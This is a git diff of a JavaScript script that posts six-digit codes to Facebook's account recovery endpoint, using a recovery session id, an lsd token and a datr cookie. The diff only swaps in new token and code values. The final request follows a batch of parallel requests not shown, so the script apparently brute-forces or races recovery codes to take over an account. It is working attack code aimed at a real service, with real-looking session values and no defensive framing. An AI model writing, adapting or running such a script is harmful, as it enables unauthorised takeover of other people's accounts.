@@ -13,8 +13,8 @@ const httpClient = new Http2Client(false);
 const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
 
 (async () => {
-  const cuid = 'AYio3bhMewAUhanbQTO8t_pTE3ocmDBOjVIa06vpQmNVR6ThpdQ9HrxYVw7yPTkFHNxHxNii8VTKznoVWU38-Tb4F9IKNe4Eus5PJ_xDTeSQ6BWl9UZeqLZTsgZULMKWclC9BMx-K9C83Ya9Ajv-LYbw7ptjvR9B_L48s74PGdLrsBQOGeuGiLmyV5JPs6L1W67vQmdYklomcJ47ThcZ6wS71C8DCzoA4pY6wzhMhJDdOzgpXtxSrlqtUGTurJUGV_n6vkLnJYReiGm7y4hmL5WoSnmags3wvnXOc1qTrQTngQ';
-  const lsd = 'AVpc27UCK1s';
+  const cuid = 'AYhK14oo9cuj1Agr_2Fil2yi1OIMkuGunRn1opjcWhwHLVc1IKFVVNHfrVp6Lhpctozmlm6EyF8nzsJwd35kKWqqPuJsiayujr_seO29-_q6NY6CXnh2m6-T5mCVONsEQW52o6s_mBZt02VuuooikqRlyguJbnh9oKnUupOs28mOww';
+  const lsd = 'AVpc27UCGHI';
   const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
   const headers = {
     'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
@@ -34,6 +34,6 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
 
   Promise.all(p).then(() => {
     log('end');
-    httpClient.post(url, headers, 'lsd='+lsd+'&n=896475').then(res => log(res.statusCode));
+    httpClient.post(url, headers, 'lsd='+lsd+'&n=402796').then(res => log(res.statusCode));
   });
 })();
